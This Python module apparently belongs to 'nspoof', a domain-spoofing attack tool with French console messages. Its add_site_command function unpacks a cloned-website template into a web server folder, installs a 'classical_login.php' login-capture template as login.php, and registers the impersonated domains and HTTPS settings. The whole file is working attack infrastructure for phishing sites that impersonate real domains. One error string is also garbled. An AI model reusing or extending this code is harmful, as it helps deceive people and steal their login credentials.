import sys
import os
import tarfile
import shutil
import subprocess
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'utils')))
from renew_config_file import renew_config_file

#
# Function for creating file.
#
def create_file(directory, filename, content):
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    full_path = os.path.join(directory, filename)
    
    with open(full_path, 'w', encoding='utf-8') as file:
        file.write(content)

#
# Handler for adding a website to spoofed websites.
#
def add_site_command(params):

	# Check if attack status is pending or not
	if ATTACK_STATUS['status'] != 0:
		print("L'attaque est déja en cours.")
		return
	
	# Check for parameters
	if len(params) < 3:
		print("Vous devez spécifier au moins un domaine, un le chemin d'un fichier ZIP contenant les fichiers du site à usurper, et l'activation du HTTPS.")
		return

	# Check for length of websites
	if len(WEBSITES) == 0:
		idd = 1
	else:
		idd = WEBSITES[-1][0] + 1

	# Get domains
	domains = params[:-2]

	# Recreation of folder
	try:

		newdir = ENV['webserver_location'] + '/nspoof' + str(idd)

		if os.path.exists(newdir):
			shutil.rmtree(newdir)

	except:
		print("Erreur lors de la recréation du dossier.")
		return

	# Recreation of temp folder
	try:

		tmpdir = ENV['nspoof_location'] + "/tmp"

		if os.path.exists(tmpdir):
			shutil.rmtree(tmpdir)

		os.makedirs(tmpdir)

	except Exception as e:
		print("Erreur lors de la recréation du dossier temporair''e.")
		return

	# Extraction of tarfile
	try:
		tar_path = os.path.join(ENV['nspoof_location'], "web-templates", params[-2] + ".tar.gz")
		root_folder = os.path.join(tmpdir, params[-2])  # Nom de l'archive sans .tar.gz
		os.makedirs(root_folder, exist_ok=True)
		with tarfile.open(tar_path, 'r:gz') as tar:
			tar.extractall(path=root_folder)
	except:
		print("Erreur. Le fichier tar n'existe pas.")
		return

	subprocess.run(['mv', tmpdir + '/' + params[-2], newdir], check=True)
	
	create_file(newdir, "site_id.txt", str(idd))
	create_file(newdir, "domain_name.txt", str(domains[0]))

	subprocess.run(['cp', ENV['nspoof_location'] + "/login_script_templates/classical_login.php", newdir + "/login.php"])

	new_site = [idd, domains, 0, 1, [], newdir, int(params[-1])]

	renew_config_file(domains, idd, int(params[-1]))

	WEBSITES.append(new_site)